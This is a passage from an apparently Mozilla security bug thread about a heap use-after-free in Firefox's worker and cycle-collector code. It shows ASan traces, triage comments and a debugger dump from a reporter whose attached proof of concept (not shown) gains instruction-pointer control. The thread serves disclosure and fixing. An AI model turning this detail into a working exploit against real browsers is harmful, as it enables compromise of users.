    #10 0x7faef508d423 in js::gc::GCRuntime::collect(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7622:9
    #11 0x7faef502347d in js::gc::GCRuntime::gc(JSGCInvocationKind, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7710:3
    #12 0x7faeef978f39 in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2325:5
    #13 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #14 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #15 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #16 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #17 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #18 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #19 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #20 0x7faf0884e05d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #21 0x7faf084946b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)

previously allocated by thread T22 (DOM Worker) here:
    #0 0x55c5c6461503 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3
    #1 0x55c5c6495f9d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15
    #2 0x7faeefd8af22 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10
    #3 0x7faeefd8af22 in mozilla::dom::XMLHttpRequestWorker::Construct(mozilla::dom::GlobalObject const&, mozilla::dom::MozXMLHttpRequestParameters const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestWorker.cpp:1482
    #4 0x7faeefd8a049 in mozilla::dom::XMLHttpRequest::Constructor(mozilla::dom::GlobalObject const&, mozilla::dom::MozXMLHttpRequestParameters const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequest.cpp:51:10
    #5 0x7faeecffb4f7 in mozilla::dom::XMLHttpRequest_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:2557:64
    #6 0x7faef4007905 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #7 0x7faef4007905 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #8 0x7faef4007905 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #9 0x7faef3fe4f1c in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3063:16
    #10 0x7faef3fced88 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #11 0x7faef4009ef9 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #12 0x7faef400a66c in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #13 0x7faef4287694 in bool Evaluate<char16_t>(JSContext*, js::ScopeKind, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:539:10
    #14 0x7faef4286a0a in JS::Evaluate(JSContext*, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:557:10
    #15 0x7faeef98a456 in mozilla::dom::(anonymous namespace)::ScriptExecutorRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:1989:10
    #16 0x7faeef9c9f82 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #17 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7faeef9b904e in mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3646:7
    #20 0x7faeef95b555 in Run /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:1169:27
    #21 0x7faeef95b555 in mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2149
    #22 0x7faeef95a972 in mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2259:3
    #23 0x7faeef9dd1c5 in mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:340:5
    #24 0x7faeef9c9f82 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #25 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #26 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #27 0x7faeef9b07ea in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2748:7
    #28 0x7faeef978f0b in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40
    #29 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #30 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #31 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #32 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #33 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #34 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #35 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11

Thread T22 (DOM Worker) created by T0 (Web Content) here:
    #0 0x55c5c6449add in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3
    #1 0x7faf08840158 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14
    #2 0x7faf08829d3e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12
    #3 0x7faee7db3609 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8
    #4 0x7faeef9d9388 in mozilla::dom::WorkerThread::Create(mozilla::dom::WorkerThreadFriendKey const&) /builds/worker/workspace/build/src/dom/workers/WorkerThread.cpp:93:7
    #5 0x7faeef94df79 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1433:14
    #6 0x7faeef94c595 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1298:19
    #7 0x7faeef9aa8a3 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring<char16_t> const&, bool, mozilla::dom::WorkerType, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2250:24
    #8 0x7faeef95c7b7 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&, nsTSubstring<char16_t> const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41
    #9 0x7faeecfab3d0 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52
    #10 0x7faef4007905 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #11 0x7faef4007905 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #12 0x7faef4007905 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #13 0x7faef3fe4f1c in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3063:16
    #14 0x7faef3fced88 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #15 0x7faef4009ef9 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #16 0x7faef400a66c in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #17 0x7faef428491d in ExecuteScript(JSContext*, JS::Handle<JS::StackGCVector<JSObject*, js::TempAllocPolicy> >, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:455:10
    #18 0x7faeeb5b26a4 in nsJSUtils::ExecutionContext::ExecScript() /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:386:8
    #19 0x7faeefe21ef3 in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::ScriptLoadRequest*, nsJSUtils::ExecutionContext&) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2495:16
    #20 0x7faeefe1efb1 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2715:20
    #21 0x7faeefe1794c in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2222:10
    #22 0x7faeefe14322 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1803:10
    #23 0x7faeefdee73e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1526:10
    #24 0x7faeefdeda0e in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:118:18
    #25 0x7faeea1249ba in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:224:18
    #26 0x7faeea1249ba in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:727
    #27 0x7faeea11e663 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:530:7
    #28 0x7faeea12a7e0 in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:133:18
    #29 0x7faee7d86141 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32
    #30 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #31 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #32 0x7faee8e00c3a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21
    #33 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #34 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #35 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #36 0x7faef0180599 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27
    #37 0x7faef3d7bc9f in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20
    #38 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #39 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #40 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #41 0x7faef3d7b646 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34
    #42 0x55c5c64943a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28
    #43 0x55c5c64943a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263
    #44 0x7faf0743682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:331:7 in ~nsCOMPtr_base
Shadow bytes around the buggy address:
  0x0c2480012050: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2480012060: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2480012070: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c2480012080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c2480012090: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
=>0x0c24800120a0: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd
  0x0c24800120b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c24800120c0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x0c24800120d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c24800120e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c24800120f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==7061==ABORTING

```

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1545345#c1)• 6 years ago |
|  | |

I can reproduce on a windows nightly asan build after letting the testcase reload loop run for a bit (sometimes it crashes quickly, sometimes takes a while). The stack on the crashing thread I get is a little different, but still a UAF read of 8 bytes somewhere in the CycleCollector. The allocation and freed stacks are the same as shown here.

Doesn't crash on an opt build. Haven't tried a debug build to see if there are any interesting assertions firing.

Group: core-security → dom-core-securityFlags: sec-bounty?Keywords: [csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1545345#c2)• 6 years ago |
|  | |

Attached file
[UAF\_NoteXPCOMChild\_EIP\_41414141.js](attachment.cgi?id=9059231)
— [Details](attachment.cgi?id=9059231&action=edit)

Attached a PoC ( UAF\_NoteXPCOMChild\_EIP\_41414141.js ) with EIP control on 32 bit Firefox.

Firefox version: 68.0a1 (2019-04-17) (32-bit)

OS: Windows 10

(1440.6678): Access violation - code c0000005 (!!! second chance !!!)

eax=12c2d920 ebx=13daf0b4 ecx=e5e5e5e5 edx=14da0000 esi=14da0000 edi=14a2e090

eip=41414141 esp=13daf094 ebp=13daf0c8 iopl=0 nv up ei pl nz na po nc

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202

41414141 ?? ???

3:232> r

eax=12c2d920 ebx=13daf0b4 ecx=e5e5e5e5 edx=14da0000 esi=14da0000 edi=14a2e090

eip=41414141 esp=13daf094 ebp=13daf0c8 iopl=0 nv up ei pl nz na po nc

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202

41414141 ?? ???

3:232> k

# ChildEBP RetAddr

WARNING: Frame IP not in any known module. Following frames may be wrong.

00 13daf090 5a4a77b3 0x41414141

01 13daf0c8 5a49a108 xul!CCGraphBuilder::NoteXPCOMChild+0x53 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2155]

02 13daf238 5a499ebe xul!mozilla::CycleCollectedJSRuntime::TraverseGCThing+0x238 [z:\task\_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 693]

03 13daf254 5a4a7221 xul!mozilla::JSGCThingParticipant::TraverseNative+0x2e [z:\task\_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 359]

04 13daf288 5a4a9507 xul!CCGraphBuilder::BuildGraph+0x91 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2061]

05 13daf2a0 5a4a9b5c xul!nsCycleCollector::MarkRoots+0x37 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2672]

06 13daf380 5a4acc23 xul!nsCycleCollector::Collect+0x26c [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 3423]

07 13daf3e4 5bf9624a xul!nsCycleCollector\_collect+0x53 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 3948]

08 13daf3f0 5a49a949 xul!mozilla::dom::workerinternals::`anonymous namespace'::WorkerJSRuntime::CustomGCCallback+0x1a [z:\task_1555535245\build\src\dom\workers\RuntimeService.cpp @ 909] 09 13daf41c 5992dd1f xul!mozilla::CycleCollectedJSRuntime::GCCallback+0x109 [z:\task_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 797] 0a 13daf43c 5992e1c1 xul!js::gc::GCRuntime::maybeCallGCCallback+0xdf [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7377] 0b 13daf4c8 5992ec84 xul!js::gc::GCRuntime::gcCycle+0x401 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7466] 0c 13daf568 59916c59 xul!js::gc::GCRuntime::collect+0x144 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7623] 0d 13daf600 598c4254 xul!js::gc::GCRuntime::gc+0xb9 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7712] 0e 13daf618 5bf9590a xul!JS_GC+0x24 [z:\task_1555535245\build\src\js\src\jsapi.cpp @ 1189] 0f 13daf6a4 58df966c xul!mozilla::dom::workerinternals::`anonymous namespace'::WorkerThreadPrimaryRunnable::Run+0xba [z:\task\_1555535245\build\src\dom\workers\RuntimeService.cpp @ 2325]

10 13dafb88 58df915b xul!nsThread::ProcessNextEvent+0x44c [z:\task\_1555535245\build\src\xpcom\threads\nsThread.cpp @ 1180]

11 13dafbac 58df8f20 xul!NS\_ProcessNextEvent+0x2b [z:\task\_1555535245\build\src\xpcom\threads\nsThreadUtils.cpp @ 486]

12 13dafbd8 58dd0764 xul!mozilla::ipc::MessagePumpForNonMainThreads::Run+0x100 [z:\task\_1555535245\build\src\ipc\glue\MessagePump.cpp @ 333]

13 13dafc10 58df8553 xul!MessageLoop::RunHandler+0x44 [z:\task\_1555535245\build\src\ipc\chromium\src\base\message\_loop.cc @ 309]

14 13dafc48 66db8906 xul!nsThread::ThreadFunc+0x173 [z:\task\_1555535245\build\src\xpcom\threads\nsThread.cpp @ 454]

15 13dafc78 66da7e0d nss3!\_PR\_NativeRunThread+0x116 [z:\task\_1555535245\build\src\nsprpub\pr\src\threads\combined\pruthr.c @ 397]

16 13dafc84 74f10f5f nss3!pr\_root+0xd [z:\task\_1555535245\build\src\nsprpub\pr\src\md\windows\w95thred.c @ 137]

17 13dafcc0 76518494 ucrtbase!thread\_start<unsigned int (\_\_stdcall\*)(void \*)>+0x3f

18 13dafcd4 6824638b KERNEL32!BaseThreadInitThunk+0x24

19 13dafd0c 77bc41c8 mozglue!patched\_BaseThreadInitThunk+0x8b [z:\task\_1555535245\build\src\mozglue\build\WindowsDllBlocklist.cpp @ 705]

1a 13dafd54 77bc4198 ntdll!\_\_RtlUserThreadStart+0x2f

1b 13dafd64 00000000 ntdll!\_RtlUserThreadStart+0x1b

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a1252758_621888)• 6 years ago |

Assignee: nobody → ytausky

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1545345#c3)• 6 years ago |
|  | |

Running this with assertions enabled and ASAN on, I get this assertion failure:

```
Assertion failure: !mCancelAllPendingRunnables, at /Users/yarontausky/src/gecko/dom/workers/WorkerPrivate.cpp:3294
#01: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb811fa8]
#02: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8114d1]
#03: mozilla::dom::XMLHttpRequestWorker::SendInternal(mozilla::dom::SendRunnable*, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xbe038cd]
#04: mozilla::dom::XMLHttpRequestWorker::Send(JSContext*, mozilla::dom::Nullable<mozilla::dom::DocumentOrBlobOrArrayBufferViewOrArrayBufferOrFormDataOrURLSearchParamsOrUSVString> const&, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xbe07c90]
#05: mozilla::dom::XMLHttpRequest_Binding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x7b63faf]
#06: bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x8b8aa1d]
#07: CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11713d3b]
#08: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11711c8f]
#09: Interpret(JSContext*, js::RunState&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x116e9c9d]
#10: js::RunScript(JSContext*, js::RunState&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x116c7a5e]
#11: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11711c34]
#12: js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1171588d]
#13: JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x12a77a58]
#14: mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x7f6fc43]
#15: void mozilla::dom::EventHandlerNonNull::Call<nsCOMPtr<mozilla::dom::EventTarget> >(nsCOMPtr<mozilla::dom::EventTarget> const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionH[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95e2940]
#16: mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95df712]
#17: mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x958dea3]
#18: mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x958fdd0]
#19: mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9569b38]
#20: mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9567316]
#21: mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x956f585]
#22: mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x957a2ba]
#23: mozilla::DOMEventTargetHelper::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9512c9d]
#24: mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95a3902]
